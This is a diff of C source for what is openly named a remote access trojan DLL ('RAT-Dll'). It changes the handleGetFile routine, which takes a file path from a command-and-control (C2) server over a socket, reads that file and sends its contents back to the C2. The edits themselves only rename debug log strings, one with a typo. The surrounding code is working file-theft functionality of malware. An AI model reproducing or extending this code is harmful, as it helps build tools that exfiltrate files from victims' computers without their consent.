@@ -25,13 +25,13 @@ INT handleGetFile(SOCKET clientSock)
     status = recv(clientSock, recvBuf, recvBufLen, 0);
     if (status != SOCKET_ERROR) // TODO: change this to match conditional like above; check for failure and fail out otherwise continue 
     {
-        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing get file on %s...\n", recvBuf);
+        sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Performing get file on %s...\n", recvBuf);
         OutputDebugStringA(msgBuf);
 
         char** fileBytes = (char**)malloc(sizeof(char*));
         if (fileBytes == NULL)
         {
-            OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
+            OutputDebugStringA("RAT-Dll-GetFile::handleGetFile - Failed to allocate space for fileBytes buffer! \n");
             status = FAILURE;
             goto cleanup;
         }
@@ -42,32 +42,32 @@ INT handleGetFile(SOCKET clientSock)
         if (status != SUCCESS)
         {
             // Send back failure here as well 
-            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performGetFile %d\n", status);
+            sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Failure recevied from performGetFile %d\n", status);
             OutputDebugStringA(msgBuf);
             goto cleanup;
         }
 
-        sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %d bytes from file\n", bufferSize);
+        sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Read %d bytes from file\n", bufferSize);
         OutputDebugStringA(msgBuf);
 
-        OutputDebugStringA("RAT-Dll-Connect::startListen - Sending status SUCCESS back to C2...\n");
+        OutputDebugStringA("RAT-Dll-GetFile::handleGtFile - Sending status SUCCESS back to C2...\n");
 
         // Change this to code constants later... bit dumb to have string here but whatever 
         status = send(clientSock, "SUCCESS", 7, 0);
         if (status == SOCKET_ERROR)
         {
-            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
+            sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Failure recevied from send (status code) %d\n", WSAGetLastError());
             OutputDebugStringA(msgBuf);
             status = WSAGetLastError();
             goto cleanup;
         }
 
-        OutputDebugStringA("RAT-Dll-Connect::startListen - Sending buffer back to C2...\n");
+        OutputDebugStringA("RAT-Dll-GetFile::handleGetFile - Sending buffer back to C2...\n");
 
         status = send(clientSock, *fileBytes, bufferSize, 0);
         if (status == SOCKET_ERROR)
         {
-            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
+            sprintf_s(msgBuf, "RAT-Dll-GetFile::handleGetFile - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
             OutputDebugStringA(msgBuf);
             status = WSAGetLastError();
             goto cleanup;
@@ -81,7 +81,7 @@ INT handleGetFile(SOCKET clientSock)
     // Failed to get our file path...
     else
     {
-        OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (file path)\n");
+        OutputDebugStringA("RAT-Dll-GetFile::handleGetFile - Failure received from recv (file path)\n");
         status = FAILURE;
         goto cleanup;
     }
